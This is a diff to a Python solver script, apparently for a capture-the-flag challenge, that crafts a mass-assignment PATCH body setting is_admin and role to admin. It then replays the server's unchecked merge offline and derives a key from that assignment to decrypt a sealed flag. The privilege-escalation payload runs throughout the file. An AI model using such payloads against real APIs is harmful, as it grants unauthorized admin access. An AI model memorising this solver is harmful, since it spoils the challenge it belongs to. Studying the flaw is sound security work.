@@ -2,8 +2,9 @@
 """Craft the privileged PATCH body, replay the server logic offline, unseal.
 
 The endpoint merges the request JSON into the user record with no allowlist. We
-add is_admin=true (the field the benign capture proves is mergeable), re-run the
-/api/me/flag authorization + unseal exactly as app.py does.
+send the privileged assignment (is_admin=true AND role=admin), then re-run the
+/api/me/flag path. The seal key is the canonical JSON of that exact assignment,
+so building the right mass-assignment request is what produces the key offline.
 """
 
 import hashlib
@@ -14,8 +15,9 @@ import re
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
 
-# The malicious PATCH /api/me body.
-PAYLOAD = {"is_admin": True}
+# The malicious PATCH /api/me body: the privileged mass-assignment.
+PAYLOAD = {"is_admin": True, "role": "admin"}
+ADMIN_ASSIGNMENT = ("is_admin", "role")
 
 
 def sealed_hex() -> str:
@@ -38,13 +40,15 @@ def main() -> None:
     user = next(u for u in store["users"] if u["id"] == 7)
     assert user["is_admin"] is False
 
-    # PATCH /api/me merges the body wholesale.
+    # PATCH /api/me merges the body wholesale (mass assignment).
     user.update(PAYLOAD)
-    assert user["is_admin"] is True, "escalation failed"
+    assert user["is_admin"] is True and user["role"] == "admin", "escalation failed"
 
-    # GET /api/me/flag admin path.
+    # GET /api/me/flag: key derived from the privileged assignment on the record.
+    assignment = {k: user[k] for k in ADMIN_ASSIGNMENT}
+    canonical = json.dumps(assignment, sort_keys=True, separators=(",", ":"))
+    key = hashlib.sha256(canonical.encode()).digest()
     ct = bytes.fromhex(sealed_hex())
-    key = hashlib.sha256(b"profile-svc-admin-seal-2026").digest()
     flag = bytes(a ^ b for a, b in zip(ct, keystream(key, len(ct)))).decode()
     print(flag)
 
